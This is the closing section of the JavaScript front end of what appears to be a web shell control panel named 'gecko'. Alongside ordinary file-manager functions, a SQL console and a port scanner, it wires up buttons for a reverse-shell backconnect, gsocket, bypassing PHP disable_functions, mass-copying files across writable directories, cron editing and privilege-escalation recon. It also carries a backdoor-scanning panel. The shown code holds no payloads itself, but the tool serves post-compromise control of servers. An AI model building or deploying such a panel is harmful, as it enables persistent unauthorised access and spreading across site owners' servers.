  renderBlueQuarantine(d.entries||[], d.dir||'');
}

function getBlueQuarantineSelectedIds(all){
  if(all) return S.blueQuarantine.map(e=>e.id);
  const ids = [];
  $$('.blue-q-cb:checked').forEach(cb=>{ if(cb.dataset.id) ids.push(cb.dataset.id); });
  return ids;
}

async function restoreBlueQuarantine(ids){
  if(!ids.length) return toast('No items selected','error');
  const out = $('#blueOutBackdoor');
  if(out){ out.textContent='Restoring '+ids.length+' file(s)…'; out.className='tool-output tall sec-terminal-out'; }
  const d = await api('blue_restore',{ids});
  if(!d.ok){ if(out) out.textContent=d.error||'Restore failed'; return toast(d.error||'Failed','error'); }
  if(out) out.textContent = d.output || 'Restored';
  await loadBlueQuarantine();
  toast('Restored '+(d.count||0)+' file(s)'+(d.failed&&d.failed.length?' · '+d.failed.length+' failed':''), d.failed&&d.failed.length?'error':'ok');
}

function showBlueDeleteConfirm(paths, label){
  if(!paths.length) return toast('No files selected','error');
  S.blueDeleteQueue = paths;
  $('#blueDeleteMsg').textContent = label || ('Pindahkan '+paths.length+' file ke quarantine (.gecko_quarantine/)?');
  openM('#mBlueDelete');
}

async function executeBlueDelete(){
  const paths = S.blueDeleteQueue || [];
  if(!paths.length){ closeAll(); return; }
  closeAll();
  const out = $('#blueOutBackdoor');
  if(out){ out.textContent='Moving '+paths.length+' file(s) to quarantine…'; out.className='tool-output tall sec-terminal-out'; }
  const d = await api('blue_delete',{paths});
  if(!d.ok){
    if(out) out.textContent = (d.output || d.error || 'Quarantine failed');
    return toast(d.error||'Failed','error');
  }
  if(out) out.textContent = d.output || 'Done';
  const norm = p => String(p||'').replace(/\\/g,'/').toLowerCase();
  const movedSet = new Set((d.deleted||[]).map(norm));
  S.blueFindings = S.blueFindings.filter(f=>!movedSet.has(norm(f.path)));
  renderBlueThreats(S.blueFindings);
  S.blueDeleteQueue = [];
  await loadBlueQuarantine();
  toast('Quarantined '+(d.count||0)+' file(s)'+(d.failed&&d.failed.length?' · '+d.failed.length+' failed':''), d.failed&&d.failed.length?'error':'ok');
}

async function runBackdoorScan(){
  const out = $('#blueOutBackdoor');
  const meta = $('#blueMeta');
  const aggressive = $('#blueAggressive') ? $('#blueAggressive').checked : false;
  clearBlueThreatsUI();
  if(out){ out.textContent=(aggressive?'Aggressive':'Standard')+' scan running…'; out.className='tool-output tall sec-terminal-out loading'; }
  if(meta) meta.textContent='Scanning…';
  setScanProgress(out, true);
  const t0 = performance.now();
  let d;
  try {
    d = await api('blue_tool',{tool:'backdoor', path:$('#blueScanPath').value.trim(), aggressive:aggressive?1:0});
  } finally {
    setScanProgress(out, false);
  }
  const ms = Math.round(performance.now()-t0);
  if(!d.ok){
    if(out){ out.textContent=d.error||'Failed'; out.className='tool-output tall empty sec-terminal-out'; }
    if(meta) meta.textContent='Error · '+ms+'ms';
    return toast(d.error||'Failed','error');
  }
  if(out){ out.textContent=d.output||'(no output)'; out.className='tool-output tall sec-terminal-out'; }
  if(meta){
    let info = 'backdoor · '+ms+'ms · '+d.scanned+' scanned';
    if(d.count!==undefined) info += ' · '+d.count+' finding(s)';
    if(d.critical) info += ' · '+d.critical+' critical/high';
    meta.textContent = info;
  }
  if(d.findings && d.findings.length){
    renderBlueThreats(d.findings);
    toast(d.count+' threat(s) found — review & quarantine or keep','error');
  }else{
    renderBlueThreats([]);
    toast('Scan complete — no threats detected','ok');
  }
  return d;
}

$('#blueRunBackdoor').onclick=runBackdoorScan;
$('#blueSelectAll').onclick=()=>$$('.blue-threat-cb').forEach(cb=>{cb.checked=true});
$('#blueSelectNone').onclick=()=>$$('.blue-threat-cb').forEach(cb=>{cb.checked=false});
$('#blueDeleteSelected').onclick=()=>{
  const paths = getBlueSelectedPaths(false);
  showBlueDeleteConfirm(paths, 'Pindahkan '+paths.length+' file terpilih ke quarantine?');
};
$('#blueDeleteAll').onclick=()=>{
  const paths = getBlueSelectedPaths(true);
  showBlueDeleteConfirm(paths, 'Quarantine SEMUA '+paths.length+' ancaman terdeteksi?');
};
$('#blueKeepAll').onclick=dismissBlueThreats;
$('#blueDeleteConfirm').onclick=executeBlueDelete;
$('#blueRefreshQuarantine').onclick=loadBlueQuarantine;
$('#blueRestoreSelected').onclick=()=>restoreBlueQuarantine(getBlueQuarantineSelectedIds(false));
$('#blueRestoreAll').onclick=()=>restoreBlueQuarantine(getBlueQuarantineSelectedIds(true));
$('#blueRunFullAudit').onclick=()=>blueRunTool('fullaudit','blueOutFullAudit',{path:$('#blueAuditPath').value.trim()});
$('#blueRunRecent').onclick=()=>blueRunTool('recent','blueOutRecent',{path:$('#blueRecentPath').value.trim(),days:parseInt($('#blueRecentDays').value,10)||7});
$('#blueRunWritable').onclick=()=>blueRunTool('writable','blueOutWritable',{path:$('#blueScanPath').value.trim()});
$('#blueRunHidden').onclick=()=>blueRunTool('hidden','blueOutHidden',{path:$('#blueScanPath').value.trim()});
$('#blueRunCron').onclick=()=>blueRunTool('cron','blueOutCron');
$('#blueRunPersistence').onclick=()=>blueRunTool('persistence','blueOutPersistence',{path:$('#bluePersistPath').value.trim()});
$('#blueCopyPersistence').onclick=async()=>{
  const txt=$('#blueOutPersistence').textContent||'';
  if(!txt||txt.includes('Klik Run')) return toast('Nothing to copy','error');
  const ok = await copyText(txt);
  if(ok) toast('Report copied'); else toast('Copy failed','error');
};
$('#blueRunLogs').onclick=()=>blueRunTool('logs','blueOutLogs');
$('#blueRunIoc').onclick=()=>blueRunTool('ioc','blueOutIoc',{path:$('#blueScanPath').value.trim()});
$('#blueRunProcess').onclick=()=>blueRunTool('process','blueOutProcess');
$('#blueCopyBackdoor').onclick=async()=>{
  const txt=$('#blueOutBackdoor').textContent||'';
  if(!txt||txt.startsWith('Scans up to')) return toast('Nothing to copy','error');
  const ok = await copyText(txt);
  if(ok) toast('Report copied'); else toast('Copy failed','error');
};

function openPortScan(){
  openM('#mPortScan');
  $('#psOutput').textContent='Enter target and click Scan.';
  $('#psOutput').className='tool-output empty';
  $('#psTags').innerHTML='';
}

async function runPortScan(){
  const host=$('#psHost').value.trim()||'127.0.0.1';
  const ports=$('#psPorts').value.trim();
  const timeout=parseInt($('#psTimeout').value,10)||1;
  const out=$('#psOutput');
  const tags=$('#psTags');
  out.textContent='Scanning '+host+'…';
  out.className='tool-output';
  tags.innerHTML='';
  const t0=performance.now();
  const d=await api('portscan',{host,ports,timeout});
  const ms=Math.round(performance.now()-t0);
  if(!d.ok){
    out.textContent=d.error||'Scan failed';
    return toast(d.error,'error');
  }
  out.textContent='Resolved: '+(d.ip||host)+' · Scanned: '+d.scanned+' ports · Open: '+(d.open?d.open.length:0)+' · '+ms+'ms';
  if(d.open&&d.open.length){
    tags.innerHTML=d.open.map(p=>'<span class="tool-tag">'+p+'</span>').join('');
  }else{
    tags.innerHTML='<span class="tool-tag closed">No open ports found</span>';
  }
}

function renderDbResult(d){
  const el=$('#dbResult');
  if(!el) return;
  if(!d.ok){
    el.innerHTML='<div class="tool-output">'+esc(d.error||'Error')+'</div>';
    return;
  }
  if(d.type==='exec'){
    el.innerHTML='<div class="tool-output">Query executed.'+(d.message?' '+esc(d.message):'')+'</div>';
    $('#dbMeta').textContent='OK · exec';
    return;
  }
  if(!d.rows||!d.rows.length){
    el.innerHTML='<div class="tool-output empty">No rows returned ('+(d.count||0)+')</div>';
    $('#dbMeta').textContent='0 rows';
    return;
  }
  const cols=d.columns||Object.keys(d.rows[0]);
  let html='<div class="db-result-wrap"><table><thead><tr>';
  cols.forEach(c=>{ html+='<th>'+esc(c)+'</th>'; });
  html+='</tr></thead><tbody>';
  d.rows.forEach(row=>{
    html+='<tr>';
    cols.forEach(c=>{ html+='<td title="'+esc(String(row[c]!=null?row[c]:''))+'">'+esc(String(row[c]!=null?row[c]:''))+'</td>'; });
    html+='</tr>';
  });
  html+='</tbody></table></div>';
  el.innerHTML=html;
  $('#dbMeta').textContent=d.count+' row(s)';
}

function openAdminer(){
  openM('#mAdminer');
  $('#dbResult').innerHTML='';
  $('#dbTables').innerHTML='';
}

async function loadDbTables(){
  const d=await api('db_tables',dbPayload());
  const box=$('#dbTables');
  if(!d.ok){ box.innerHTML=''; return toast(d.error,'error'); }
  if(!d.tables||!d.tables.length){
    box.innerHTML='<span class="tool-note">No tables found</span>';
    return;
  }
  box.innerHTML=d.tables.map(t=>'<button type="button" class="db-table-chip" data-t="'+esc(t)+'">'+esc(t)+'</button>').join('');
  box.querySelectorAll('.db-table-chip').forEach(btn=>{
    btn.onclick=()=>{
      const t=btn.dataset.t;
      $('#dbSql').value='SELECT * FROM `'+t+'` LIMIT 50;';
    };
  });
  toast(d.tables.length+' table(s)','ok');
}

async function runDbQuery(){
  const sql=$('#dbSql').value.trim();
  if(!sql) return toast('Enter SQL query','error');
  const d=await api('db_query',Object.assign(dbPayload(),{sql}));
  renderDbResult(d);
  if(!d.ok) toast(d.error,'error');
}

$('#dbType').addEventListener('change',()=>{
  const t=$('#dbType').value;
  $('#dbPort').value=t==='pgsql'?5432:(t==='sqlite'?0:3306);
  if(t==='sqlite'){ $('#dbHost').value=''; $('#dbHost').placeholder='/path/to/database.sqlite'; }
  else { $('#dbHost').value='127.0.0.1'; $('#dbHost').placeholder=''; }
});

// ─── Context Menu ────────────────────────────────────────────────
const ctxEl=$('#ctx');
function showCtx(e,path,isDir,name,editable,perm){
  const isZip = !isDir && isZipFile(name);
  const canPaste = S.clipboard && S.clipboard.paths.length;
  const clipHint = canPaste ? `<div class="clip-indicator">${S.clipboard.paths.length} in clipboard (${S.clipboard.mode})</div>` : '';
  ctxEl.innerHTML=`
    <button class="ci" data-a="open"><svg viewBox="0 0 16 16"><path d="M8 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Z" fill="currentColor"/></svg>${isDir?'Open folder':'Open'}</button>
    ${!isDir&&editable?`<button class="ci" data-a="edit"><svg viewBox="0 0 16 16"><path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.2.201-.44.354-.706.454L3.3 14.814a.75.75 0 0 1-.963-.927l.772-2.521a1.75 1.75 0 0 1 .413-.664l8.61-8.61Z" fill="currentColor"/></svg>Edit</button>`:''}
    ${!isDir?`<button class="ci" data-a="dl"><svg viewBox="0 0 16 16"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 14.25 14H2.75Z" fill="currentColor"/></svg>Download</button>`:''}
    <div class="ctx-sep"></div>
    <button class="ci" data-a="copy"><svg viewBox="0 0 16 16"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.222a.25.25 0 0 1 .25.25v7.5a.25.25 0 0 1-.25.25H1.75A1.75 1.75 0 0 1 0 13.75Zm6.5 0v7.5a1.75 1.75 0 0 0 1.75 1.75h7.5A1.75 1.75 0 0 0 17.5 13.25v-7.5A1.75 1.75 0 0 0 15.75 4h-7.5A1.75 1.75 0 0 0 6.5 5.75Z" fill="currentColor"/></svg>Copy</button>
    <button class="ci" data-a="cut"><svg viewBox="0 0 16 16"><path d="M5.921 3.862a1.25 1.25 0 0 0-1.768 0L1.075 7.94a.75.75 0 0 0 0 1.06l3.078 3.079a1.25 1.25 0 0 0 1.768 0L9.5 6.5 5.921 3.862Z" fill="currentColor"/></svg>Cut</button>
    <button class="ci${canPaste?'':' disabled'}" data-a="paste"${canPaste?'':' disabled'}><svg viewBox="0 0 16 16"><path d="M5.921 3.862a1.25 1.25 0 0 0-1.768 0L1.075 7.94a.75.75 0 0 0 0 1.06l3.078 3.079a1.25 1.25 0 0 0 1.768 0L9.5 6.5 5.921 3.862Z" fill="currentColor"/></svg>Paste here</button>
    ${clipHint}
    <div class="ctx-sep"></div>
    ${isZip?`<button class="ci" data-a="unzip"><svg viewBox="0 0 16 16"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25V2.75A1.75 1.75 0 0 0 14.25 1H1.75Z" fill="currentColor"/></svg>Extract here</button>`:''}
    <button class="ci" data-a="zip"><svg viewBox="0 0 16 16"><path d="M1.75 1A1.75 1.75 0 0 0 0 2.75v10.5C0 14.216.784 15 1.75 15h12.5A1.75 1.75 0 0 0 16 13.25V2.75A1.75 1.75 0 0 0 14.25 1H1.75Z" fill="currentColor"/></svg>${isZip?'Re-compress':'Compress to ZIP'}</button>
    <div class="ctx-sep"></div>
    <button class="ci" data-a="chmod"><svg viewBox="0 0 16 16"><path d="M8 2a3 3 0 1 0 0 6 3 3 0 0 0 0-6ZM4.5 5a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0Z" fill="currentColor"/></svg>Permissions (Chmod)</button>
    <button class="ci" data-a="rename"><svg viewBox="0 0 16 16"><path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.2.201-.44.354-.706.454L3.3 14.814a.75.75 0 0 1-.963-.927l.772-2.521a1.75 1.75 0 0 1 .413-.664l8.61-8.61Z" fill="currentColor"/></svg>Rename</button>
    <button class="ci danger" data-a="delete"><svg viewBox="0 0 16 16"><path d="M11 1.75V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75Z" fill="currentColor"/></svg>Delete</button>`;
  ctxEl.style.left=Math.min(e.clientX,innerWidth-240)+'px';
  ctxEl.style.top=Math.min(e.clientY,innerHeight-320)+'px';
  ctxEl.classList.add('open');
  ctxEl.querySelectorAll('[data-a]').forEach(b=>{
    b.onclick=()=>{ctxEl.classList.remove('open');const a=b.dataset.a;
      if(a==='open')openItem(path,isDir,editable);
      else if(a==='edit')openEditor(path);
      else if(a==='dl') window.location='?download='+encodeURIComponent(path);
      else if(a==='copy')clipCopy([path]);
      else if(a==='cut')clipCut([path]);
      else if(a==='paste')clipPaste();
      else if(a==='zip')showZipModal([path]);
      else if(a==='unzip')extractZip(path);
      else if(a==='rename')showRename(path,name);
      else if(a==='delete')showDelete(path,name,isDir);
      else if(a==='chmod')showChmod(path,perm);
    };
  });
}
document.addEventListener('click',()=>ctxEl.classList.remove('open'));

// ─── Search ──────────────────────────────────────────────────────
const searchInput = $('#searchInput');
if (searchInput) {
  searchInput.addEventListener('input',e=>{
    clearTimeout(S.searchTimer);
    const q=e.target.value.trim();
    if(!q){$('#srList').classList.remove('open');return}
    S.searchTimer=setTimeout(async()=>{
      const d=await api('search',{path:S.path,query:q});
      const sr=$('#srList');
      if(!d.results.length){sr.innerHTML='<div class="sr-item" style="color:var(--tx3)">No results</div>';sr.classList.add('open');return}
      sr.innerHTML=d.results.map(r=>`<div class="sr-item" data-path="${esc(r.path)}" data-dir="${r.is_dir}">${ico(r.icon)}<span>${highlightQuery(r.name,q)}</span><span class="sr-path">${esc(r.path)}</span></div>`).join('');
      sr.classList.add('open');
      sr.querySelectorAll('.sr-item[data-path]').forEach(item=>item.onclick=()=>{sr.classList.remove('open');searchInput.value='';openItem(item.dataset.path,item.dataset.dir==='true',true)});
    },240);
  });
  searchInput.addEventListener('keydown', e=>{
    if(e.key !== 'Enter') return;
    const first = $('#srList .sr-item[data-path]');
    if(first){ e.preventDefault(); first.click(); }
  });
}
document.addEventListener('click',e=>{if(!e.target.closest('.search-wrap'))$('#srList').classList.remove('open')});

// ─── View ─────────────────────────────────────────────────────────
function setView(v){
  S.view=v; localStorage.setItem('gecko_view',v);
  $('#btnList').classList.toggle('active',v==='list');
  $('#btnGrid').classList.toggle('active',v==='grid');
  renderList();
}
S.view=localStorage.getItem('gecko_view')||'list';
$('#btnList').classList.toggle('active',S.view==='list');
$('#btnGrid').classList.toggle('active',S.view==='grid');

// ─── Wire-up ─────────────────────────────────────────────────────
$('#btnRefresh').onclick=()=>navigate(S.path);
$('#btnLogout').onclick=async()=>{
  try{await api('logout');}catch(e){}
  location.reload();
};
$('#btnTerm').onclick=$('#sbTerm').onclick=openTerm;
$('#sbCron').onclick=openCron;
$('#sbRecover').onclick=openRecover;
$('#recRun').onclick=runRecover;
$('#sbFindWritable').onclick=openFindWritable;
$('#fwRun').onclick=runFindWritable;
$('#fwUseCurrent').onclick=()=>{
  const pathEl=$('#fwPath');
  const cur=typeof toAbsolutePath==='function'?toAbsolutePath(S.path||''):(S.path||'');
  if(pathEl) pathEl.value=(cur&&cur!=='')?cur:'/var/www/html';
};
$('#sbMassCopy').onclick=openMassCopy;
$('#mcRun').onclick=runMassCopy;
if($('#mcV2')) $('#mcV2').onchange=mcToggleV2;
if($('#mcV3')) $('#mcV3').onchange=mcToggleV3;
$('#mcCopyUrls').onclick=mcCopyUrls;
$('#mcDownloadTxt').onclick=mcDownloadTxt;
$('#sbBypassDf').onclick=openBypassDf;
if($('#bpRun')) $('#bpRun').onclick=runBypassDf;
if($('#bpCheck')) $('#bpCheck').onclick=()=>checkBypassDf(false);
$('#sbBackconnect').onclick=openBackconnect;
$('#sbGsocket').onclick=openGsocket;
$('#sbPortScan').onclick=openPortScan;
$('#sbAdminer').onclick=openAdminer;
$('#cronReload').onclick=loadCron;
$('#cronSave').onclick=saveCron;
$('#bcStart').onclick=startBackconnect;
$('#gsRun').onclick=runGsocket;
$('#psScan').onclick=runPortScan;
$('#dbRun').onclick=runDbQuery;
$('#dbTablesBtn').onclick=loadDbTables;
$('#dbOpenAdminer').onclick=()=>window.open('?adminer=1','_blank');
$('#sbSecHub').onclick=()=>openSecHub('recon');
$('#sbSecRecon').onclick=()=>openSecHub('recon');
$('#sbSecSensitive').onclick=()=>openSecHub('sensitive');
$('#sbSecHttp').onclick=()=>openSecHub('http');
$('#sbSecPrivesc').onclick=()=>openSecHub('privesc');
$('#sbBlueHub').onclick=()=>openBlueHub('backdoor');
$('#sbBlueBackdoor').onclick=()=>openBlueHub('backdoor');
$('#sbBluePersistence').onclick=()=>openBlueHub('persistence');
$('#sbBlueAudit').onclick=()=>{ openBlueHub('fullaudit'); };
$('#sbNewFile').onclick=()=>showCreate('file');
$('#sbNewFolder').onclick=()=>showCreate('folder');
$('#sbUpload').onclick=()=>openM('#mUpload');
$('#sbDelSel').onclick=deleteSelected;
$('#btnList').onclick=()=>setView('list');
$('#btnGrid').onclick=()=>setView('grid');
$('#btnUp').onclick = () => {
    const p = S.path;
    if (!p) return;
    
    // Handle Windows drive path
    if (p.match(/^[A-Za-z]:\//)) {
        let drive = p.substring(0, 2);
        let afterDrive = p.substring(2).replace(/^\//, '');
        
        if (!afterDrive) {
            // At drive root, go to default base or stay
            return;
        } else {
            let parts = afterDrive.split('/');
            parts.pop();
            let newPath = drive + '/' + (parts.join('/') || '');
            if (newPath !== drive + '/') {
                newPath = newPath + '/';
            }
            navigate(newPath);
        }
    }
    // Handle absolute Linux path
    else if (p.startsWith('/')) {
        if (p === '/') return;
        
        let cleanPath = p;
        if (cleanPath !== '/' && cleanPath.endsWith('/')) {
            cleanPath = cleanPath.slice(0, -1);
        }
        
        const parts = cleanPath.split('/');
        parts.pop();
        let newPath = parts.join('/') || '/';
        if (newPath !== '/') {
            newPath = newPath + '/';
        }
        navigate(newPath);
    }
    // Handle relative path
    else {
        const pts = p.split('/');
        pts.pop();
        navigate(pts.join('/'));
    }
};

// ─── Sidebar drawer (mobile) ─────────────────────────────────────
const sidebar = $('#sidebar');
const sbBackdrop = $('#sbBackdrop');
const btnBurger = $('#btnBurger');
const isMobile = () => window.matchMedia('(max-width: 960px)').matches;

function openSidebar(){
  if (!isMobile()) return;
  sidebar.classList.add('open');
  sbBackdrop.classList.add('show');
  // Frame delay supaya transition sempat dipicu
  requestAnimationFrame(()=>sbBackdrop.classList.add('open'));
  btnBurger.setAttribute('aria-expanded','true');
  document.body.style.overflow = 'hidden';
}
function closeSidebar(){
  sidebar.classList.remove('open');
  sbBackdrop.classList.remove('open');
  btnBurger.setAttribute('aria-expanded','false');
  document.body.style.overflow = '';
  // Hapus .show setelah transition selesai agar backdrop tidak menghalangi klik
  setTimeout(()=>{ if (!sbBackdrop.classList.contains('open')) sbBackdrop.classList.remove('show'); }, 240);
}
function toggleSidebar(){
  sidebar.classList.contains('open') ? closeSidebar() : openSidebar();
}
btnBurger.addEventListener('click', toggleSidebar);
sbBackdrop.addEventListener('click', closeSidebar);

// Auto-close drawer ketika user menekan tombol di sidebar (di mobile)
sidebar.addEventListener('click', e => {
  if (!isMobile()) return;
  const btn = e.target.closest('.sb-btn');
  if (btn) closeSidebar();
});

// Auto-close ketika resize ke desktop
let resizeRaf;
window.addEventListener('resize', () => {
  cancelAnimationFrame(resizeRaf);
  resizeRaf = requestAnimationFrame(() => {
    if (!isMobile() && sidebar.classList.contains('open')) closeSidebar();
  });
});

// ─── Hotkeys ─────────────────────────────────────────────────────
document.addEventListener('keydown',e=>{
  if(e.ctrlKey&&e.key==='k'){e.preventDefault();if(searchInput)searchInput.focus()}
  if(e.ctrlKey&&e.key==='`'){e.preventDefault();openTerm()}
  if(e.key==='F5'){e.preventDefault();navigate(S.path)}
  if(e.ctrlKey&&e.key==='s'&&$('#mEditor').classList.contains('open')){e.preventDefault();saveEditor()}
  if(e.key==='?' && !e.target.matches('input,textarea,select,[contenteditable]')){ e.preventDefault(); openM('#mKeyboard'); }
  const inField = e.target.matches('input,textarea,select,[contenteditable]');
  if(!inField && (e.ctrlKey||e.metaKey) && e.key==='c' && S.selected.size){
    e.preventDefault(); clipCopy([...S.selected]);
  }
  if(!inField && (e.ctrlKey||e.metaKey) && e.key==='x' && S.selected.size){
    e.preventDefault(); clipCut([...S.selected]);
  }
  if(!inField && (e.ctrlKey||e.metaKey) && e.key==='v' && S.clipboard && S.clipboard.paths.length){
    e.preventDefault(); clipPaste();
  }
  if(e.key==='Escape'){
    if (sidebar.classList.contains('open')) closeSidebar();
    if (S.selected.size) clearSelection();
    closeAll();
  }
});

const _bulkDelBtn = $('#bulkDel');
if(_bulkDelBtn) _bulkDelBtn.onclick = deleteSelected;
const _bulkDlBtn = $('#bulkDl');
if(_bulkDlBtn) _bulkDlBtn.onclick = bulkDownload;
const _bulkCloseBtn = $('#bulkClose');
if(_bulkCloseBtn) _bulkCloseBtn.onclick = clearSelection;
const _bulkCopyBtn = $('#bulkCopy');
if(_bulkCopyBtn) _bulkCopyBtn.onclick = ()=>clipCopy([...S.selected]);
const _bulkCutBtn = $('#bulkCut');
if(_bulkCutBtn) _bulkCutBtn.onclick = ()=>clipCut([...S.selected]);
const _bulkPasteBtn = $('#bulkPaste');
if(_bulkPasteBtn) _bulkPasteBtn.onclick = ()=>clipPaste();
const _bulkMoveBtn = $('#bulkMove');
if(_bulkMoveBtn) _bulkMoveBtn.onclick = ()=>showTransferModal('move', [...S.selected]);
const _bulkZipBtn = $('#bulkZip');
if(_bulkZipBtn) _bulkZipBtn.onclick = ()=>showZipModal([...S.selected]);
$('#transferOk').onclick = executeTransfer;
$('#zipOk').onclick = executeZip;
updateClipUI();

// ─── Init ─────────────────────────────────────────────────────────
const initPath = pathFromQuery();
if (initPath) {
    navigate(initPath);
} else {
    // Jika tidak ada path, set S.path ke BASE atau biarkan kosong
    // Tapi breadcrumb akan menampilkan baseDirName
    S.path = '';
    renderBreadcrumb();
    // Load files from BASE
    navigate('');
}

loadInfo();
loadDrives();
initSidebarSections();
initThemeToggle();
applyEdWrap();
const _btnCopyPath = $('#btnCopyPath');
if(_btnCopyPath) _btnCopyPath.onclick = copyCurrentPath;
const _stPath = $('#stPath');
if(_stPath) _stPath.onclick = copyCurrentPath;
const _btnHelp = $('#btnHelp');
if(_btnHelp) _btnHelp.onclick = ()=>openM('#mKeyboard');
$$('#blueFilterBar .blue-filter').forEach(btn=>{
  btn.onclick = ()=>{
    S.blueSevFilter = btn.dataset.sev || 'ALL';
    renderBlueThreats(S.blueFindings);
  };
});
</script>
</body>
</html>